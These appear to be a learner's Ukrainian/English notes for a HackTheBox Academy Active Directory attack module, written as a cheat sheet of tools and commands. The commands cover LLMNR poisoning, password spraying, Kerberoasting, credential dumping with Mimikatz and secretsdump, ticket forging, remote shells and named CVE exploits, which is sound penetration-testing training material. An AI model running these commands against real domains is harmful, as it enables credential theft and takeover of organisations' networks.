# Tools of the Trade — Active Directory

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1517](https://academy.hackthebox.com/app/module/143/section/1517) |

---

## 📁 Де знаходяться інструменти в лабі

| OS | Шлях |
|----|------|
| Windows (MS01) | `C:\Tools\` |
| Linux (ATTACK01) | `/opt/` або встановлені глобально |

---

## 🛠️ Повний список інструментів

### Enumeration & Reconnaissance

| Інструмент | Опис | Команда |
|------------|------|---------|
| **PowerView** | PowerShell — situational awareness в AD, замінник `net*` команд | `Import-Module .\PowerView.ps1` |
| **SharpView** | .NET порт PowerView | `.\SharpView.exe` |
| **BloodHound** | Візуальна карта AD відносин та шляхів атаки (GUI) | Запускається як застосунок |
| **SharpHound** | C# інгестор — збирає дані для BloodHound | `.\SharpHound.exe -c All` |
| **BloodHound.py** | Python інгестор для BloodHound (без domain join) | `bloodhound-python -d domain -u user -p pass -c All` |
| **enum4linux** | Енумерація Windows/Samba систем | `enum4linux -a <ip>` |
| **enum4linux-ng** | Оновлена версія enum4linux | `enum4linux-ng -A <ip>` |
| **ldapsearch** | Вбудований LDAP клієнт | `ldapsearch -H ldap://<ip> -x -b "DC=domain,DC=local"` |
| **windapsearch** | Python скрипт для LDAP запитів до AD | `python3 windapsearch.py -d domain -u user -p pass --da` |
| **adidnsdump** | Дамп DNS записів домену (як zone transfer) | `adidnsdump -u domain\\user <dc_ip>` |
| **rpcclient** | RPC клієнт для AD enum (Samba) | `rpcclient -U "user%pass" <ip>` |
| **rpcinfo** | Запит RPC сервісів на хості | `rpcinfo -p <ip>` |
| **smbmap** | SMB share enum по домену | `smbmap -H <ip> -u user -p pass` |
| **Snaffler** | Пошук credentials у файлах на SMB shares | `.\Snaffler.exe -s -d domain -o snaffler.log` |
| **PingCastle** | Аудит безпеки AD (risk assessment) | GUI застосунок |
| **Group3r** | Аудит GPO на security misconfigurations | `.\Group3r.exe` |
| **ADRecon** | Витяг даних з AD у форматі Excel | `.\ADRecon.ps1` |
| **AD Explorer** | AD viewer/editor (Sysinternals) | GUI застосунок |

---

### Credential Attacks

| Інструмент | Опис | Команда |
|------------|------|---------|
| **Kerbrute** | Go — enum AD акаунтів через Kerberos, password spray | `kerbrute userenum -d domain --dc <ip> users.txt` |
| **Responder** | LLMNR/NBT-NS/MDNS poisoning → NetNTLMv2 hashes | `sudo responder -I eth0 -wf` |
| **Inveigh.ps1** | PowerShell аналог Responder | `Invoke-Inveigh` |
| **InveighZero** | C# версія Inveigh з інтерактивною консоллю | `.\Inveigh.exe` |
| **DomainPasswordSpray.ps1** | Password spray по всіх юзерах домену | `Invoke-DomainPasswordSpray -Password Welcome1` |
| **Hashcat** | Крекінг хешів | `hashcat -m 13100 hash.txt rockyou.txt` |
| **gpp-decrypt** | Декрипт паролів з Group Policy Preferences | `gpp-decrypt <hash>` |

---

### Kerberos Attacks

| Інструмент | Опис | Команда |
|------------|------|---------|
| **Rubeus** | C# — повний Kerberos abuse toolkit | `.\Rubeus.exe kerberoast /outfile:hashes.txt` |
| **GetUserSPNs.py** | Impacket — Kerberoasting | `GetUserSPNs.py domain/user:pass -dc-ip <ip> -request` |
| **GetNPUsers.py** | Impacket — AS-REP Roasting | `GetNPUsers.py domain/ -usersfile users.txt -no-pass` |
| **ticketer.py** | Impacket — створення Golden/Silver tickets | `ticketer.py -nthash <hash> -domain-sid <sid> -domain domain admin` |
| **gettgtpkinit.py** | Маніпуляції з сертифікатами та TGT | `python3 gettgtpkinit.py domain/user -dc-ip <ip> user.ccache` |
| **getnthash.py** | Отримання NT hash через TGT (U2U) | `python3 getnthash.py domain/user -key <key>` |

---

### Lateral Movement & Post-Exploitation

| Інструмент | Опис | Команда |
|------------|------|---------|
| **CrackMapExec (CME)** | SMB/WMI/WinRM enum, spray, exec | `crackmapexec smb <ip> -u user -p pass --shares` |
| **Impacket** | Колекція Python інструментів для AD атак | Різні скрипти |
| **psexec.py** | Impacket — semi-interactive shell через SMB | `psexec.py domain/user:pass@<ip>` |
| **wmiexec.py** | Impacket — виконання команд через WMI | `wmiexec.py domain/user:pass@<ip>` |
| **evil-winrm** | Interactive shell через WinRM | `evil-winrm -i <ip> -u user -p pass` |
| **mssqlclient.py** | Impacket — взаємодія з MSSQL | `mssqlclient.py domain/user:pass@<ip>` |
| **smbserver.py** | Impacket — простий SMB сервер для передачі файлів | `smbserver.py share /path/to/files` |
| **Mimikatz** | Pass-the-hash, plaintext passwords, Kerberos tickets | `sekurlsa::logonpasswords` |
| **secretsdump.py** | Impacket — дамп SAM/LSA secrets remotely | `secretsdump.py domain/user:pass@<ip>` |
| **setspn.exe** | Управління SPN (вбудований Windows) | `setspn -L user` |

---

### Exploits & Special Attacks

| Інструмент | Опис | CVE |
|------------|------|-----|
| **noPac.py** | Impersonate DA від звичайного юзера | CVE-2021-42278 + CVE-2021-42287 |
| **CVE-2021-1675.py** | PrintNightmare PoC | CVE-2021-1675 |
| **PetitPotam.py** | Coerce Windows хости до NTLM auth | CVE-2021-36942 |
| **ntlmrelayx.py** | Impacket — SMB relay attacks | — |
| **rpcdump.py** | Impacket — RPC endpoint mapper | — |
| **lookupsid.py** | Impacket — SID bruteforcing | — |
| **raiseChild.py** | Impacket — child to parent domain privesc | — |
| **LAPSToolkit** | Аудит і атаки на LAPS (Local Admin Password Solution) | — |

---

## 🔑 Швидкі команди для старту

```bash
# Enum через SMB (без credentials)
crackmapexec smb <ip>/24

# Enum через LDAP
ldapsearch -H ldap://<dc_ip> -x -b "DC=domain,DC=local" "(objectClass=user)"

# BloodHound збір з Linux
bloodhound-python -d inlanefreight.local -u user -p pass -c All -ns <dc_ip>

# Responder (LLMNR poisoning)
sudo responder -I eth0 -wf

# Kerberoasting
GetUserSPNs.py inlanefreight.local/user:pass -dc-ip <ip> -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting
GetNPUsers.py inlanefreight.local/ -usersfile users.txt -no-pass -dc-ip <ip>
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
